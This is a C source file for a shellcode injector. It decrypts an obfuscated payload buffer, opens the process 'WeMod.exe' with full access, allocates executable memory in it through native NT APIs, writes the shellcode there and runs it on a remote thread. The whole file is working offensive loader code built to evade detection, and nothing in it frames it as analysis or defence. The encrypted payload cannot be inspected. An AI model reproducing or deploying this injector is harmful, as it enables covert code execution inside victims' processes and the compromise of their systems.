#include "processInjection.h"

unsigned char buf[] = "\xe5\x77\xb3\xbd\x62\x79\x39\xd2\xc5\x77\x29\x15\x8\xdc\xab\xf1\xe9\x7e\x8a\x9c\x45\x9\x1d\x1e\x2c\xd6\x85\x3c\xec\x2e\x46\x89\x4a\xd5\xf0\x18\x8b\x47\xa5\xc3\x70\x79\x9d\xdf\x97\x75\xca\x1b\x36\x4b\xd4\x90\xe5\x17\x31\xd5\x7f\x6c\x63\xc7\x6e\x37\x10\xc2\x5d\x1f\x1c\x34\x59\xde\xa3\xca\x8\x2a\x52\x22\x4a\xeb\xa3\xf7\xec\x27\xbd\x4f\xb5\xe4\xe3\x18\xaa\xd5\xd2\xc\x9c\x3e\xbd\x50\x1\x67\xe8\xe0\x4d\x74\xff\x10\xbe\x92\x45\xe9\xd3\x14\x54\x24\xa\xeb\x3b\xe9\x6e\xf4\x64\x75\x6a\xb9\xa3\x5b\x52\x32\x63\x75\xd1\xdd\x2b\xd8\xea\xe0\xad\xd4\xdd\xad\x8a\xbc\x94\xda\x45\xd8\x65\x1c\x69\xad\xce\x8e\x8c\x57\x1e\x2f\xc7\xfa\xa1\x7f\xad\x4c\xe5\x2f\x6d\x98\x10\x41\xc1\x6a\x97\x52\xca\xee\x88\x9c\xe6\xf3\xa3\x39\x6c\x95\xb4\xab\x14\x44\xf7\x23\xe7\x4e\x8f\x9f\x8\x21\x3f\x96\xe7\x92\xdf\x76\xe2\x42\xfe\x7e\xcc\x15\xc5\x46\x3f\x5a\xde\x1\xe1\xef\x1a\x3c\xa\x48\x42\x7b\x55\x32\xfc\x93\x4\x1f\xdf\xae\xde\x11\x71\x22\x67\x2f\x68\x76\xc9\x5a\xa8\x3a\xac\x44\x46\xde\x34\x98\xb4\xb0\xbb\xa7\xdc\x33\x39\xc8\x5b\xb8\x34\x65\x4b\xde\x49\x76\x48\x35\xb7\x76\x4c\x5a\x81\x98\x17\xa6\xa4\x37\xb0\xea\xfa\x54\x9d\xf8\xb8\xf9\xd2\x1c\xef\xc\xec\x12\xc0\xda\x68\x3f\xfd\xe6\xda\x63\x30\x8f\x83\xd4\x1f\xe5\x93\x56\xb2\x95\xf0\x53\x73\xb8\xba\x14\x30\xb1\x61\x21\xf5\x45\x41\xc2\x28\xce\xa8\x64\x37\x13\x39\xee\x8\x5f\x82\xb9\x73\xdc\x8\x4d\x53\x37\x46\x4f\xe5\x42\xe9\x86\xab\x35\x4e\x51\x75\xf1\x43\xd\xa4\x38\x6c\x29\x4c\xa3\xec\xdf\x2d\xd\x26\x1a\x77\xf9\x6\x31\x90\x23\xe1\x84\x79\x62\xbd\xd8\xaf\xf5\x81\x59\x2e\xe7\xb\x64\xcd\x55\x47\xbd\x72\x67\xcc\xfb\xfa\x91\x40\x16\x29\xe3\xa0\xdf\x38\x83\x85\x6\x40\xb1\x72\x15\x12\xb7\xdd\x86\xe2\x46\x6a\xbf\xd1\x7d\x6e\x59\x23\x38\x36\xb0\x9\x23\xbc\x1d\x86\x76\x8c\x5\x1c\x51\xd\xc6\xe8\xfe\x21\x42\x50\x59\x3d\x2f\xe6\x3a\xc6\xb5\x76\x5d\x6e\xee\xc6\x63\xf6\x48\x70\x9f\x66\xd9\xe1\x5e\x58\xa\xe0\x3b\x94\xd3\xe4\x6b\x31\xcd\x91\x41\x1c\x54\x80\xe1\x21\x95\x62\xbc\x3b\xe5\x7c\xaf\x8e\x84\x99";

int main(int argc, char* argv[]) {

	NTSTATUS status;

	_NtAllocateVirtualMemory allocateMemory = &NtAllocateVirtualMemory;
	_NtOpenProcess openProcess = &NtOpenProcess;
	_NtCreateThreadEx createThread = &NtCreateThreadEx;
	_NtWriteVirtualMemory writeMemory = &NtWriteVirtualMemory;

	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES oa;
	CLIENT_ID ci;

	LPVOID pBaseAddress = NULL;
	SIZE_T regionSize = sizeof(buf);

	HANDLE hThread = NULL;

	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	WCHAR processName[] = L"WeMod.exe";

	DWORD dwProcessId = getProcessId(processName);
	printf("Numero de proceso es: %d", dwProcessId);

	ci.UniqueProcess = (HANDLE) dwProcessId;
	ci.UniqueThread = NULL;

	decryptString(buf, strlen((char*)buf));

	openProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &ci);
	allocateMemory(hProcess, &pBaseAddress, 0, (PULONG)&regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	writeMemory(hProcess, pBaseAddress, buf, sizeof(buf), 0);
	createThread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pBaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	CloseHandle(hProcess);

	return 0;
}